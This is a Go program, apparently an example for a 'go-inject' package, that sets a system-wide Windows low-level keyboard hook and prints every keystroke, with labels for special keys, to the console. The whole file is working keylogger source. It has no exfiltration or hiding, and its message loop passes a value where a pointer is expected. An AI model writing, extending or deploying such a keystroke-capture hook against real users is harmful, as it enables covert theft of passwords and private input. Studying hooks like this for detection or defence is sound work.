package main

import (
	"fmt"
	"go-inject/inject"
	"strings"
	"unsafe"
)

type KBDLLHOOKSTRUCT struct {
	VkCode      uint32
	ScanCode    uint32
	Flags       uint32
	Time        uint32
	DwExtraInfo uintptr
}

var (
	MainTID        = uint32(0)
	WM_QUIT        = uint32(0x0012)
	WH_KEYBOARD_LL = uint32(13)
	WM_KEYDOWN     = uint32(256)

	// VK Codes
	VK_CAPITAL  = uint32(0x14)
	VK_SHIFT    = uint32(0x10)
	VK_LCONTROL = uint32(0xA2)
	VK_RCONTROL = uint32(0xA3)
	VK_INSERT   = uint32(0x2D)
	VK_END      = uint32(0x23)
	VK_PRINT    = uint32(0x2A)
	VK_DELETE   = uint32(0x2E)
	VK_BACK     = uint32(0x08)
	VK_LEFT     = uint32(0x25)
	VK_RIGHT    = uint32(0x27)
	VK_UP       = uint32(0x26)
	VK_DOWN     = uint32(0x28)
)

func conHandler() uintptr {
	inject.PostThreadMessage(uint32(MainTID), WM_QUIT, 0, 0)
	return uintptr(1)
}

func keyboardHook(nCode int, wparam uintptr, lparam uintptr) uintptr {
	p := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lparam))
	keypress := ""
	if uint32(wparam) == WM_KEYDOWN {
		switch p.VkCode {
		case VK_CAPITAL:
			keypress = "<CAPLOCK>"
			break
		case VK_SHIFT:
			keypress = "<SHIFT>"
			break
		case VK_LCONTROL:
			keypress = "<LCTRL>"
			break
		case VK_RCONTROL:
			keypress = "<RCTRL>"
			break
		case VK_INSERT:
			keypress = "<INSERT>"
			break
		case VK_END:
			keypress = "<END>"
			break
		case VK_PRINT:
			keypress = "<PRINT>"
			break
		case VK_DELETE:
			keypress = "<DELETE>"
			break
		case VK_BACK:
			keypress = "<BACK>"
			break
		case VK_LEFT:
			keypress = "<LEFT>"
			break
		case VK_RIGHT:
			keypress = "<RIGHT>"
			break
		case VK_UP:
			keypress = "<UP>"
			break
		case VK_DOWN:
			keypress = "<DOWN>"
			break
		default:
			var sb strings.Builder
			sb.WriteString(keypress)
			sb.WriteRune(rune(p.VkCode))
			keypress = sb.String()
		}
	}
	fmt.Printf("%s\n", keypress)
	return inject.CallNextHookEx(0, uint32(nCode), wparam, lparam)
}

func main() {

	MainTID, _ = inject.GetCurrentThreadId()

	inject.SetConsoleCtrlHandler(
		(inject.HANDLER)(conHandler),
		1,
	)

	hHandle := inject.GetModuleHandleA("")

	keyboardHook := inject.SetWindowsHookEx(
		WH_KEYBOARD_LL,
		(inject.HOOKPROC)(keyboardHook),
		hHandle,
		0,
	)

	msg := *new(uintptr)

	for true {
		inject.GetMessage(msg, 0, 0, 0)
		inject.TranslateMessage(msg)
		inject.DispatchMessage(msg)
	}

	inject.UnhookWindowsHookEx(keyboardHook)
	return
}
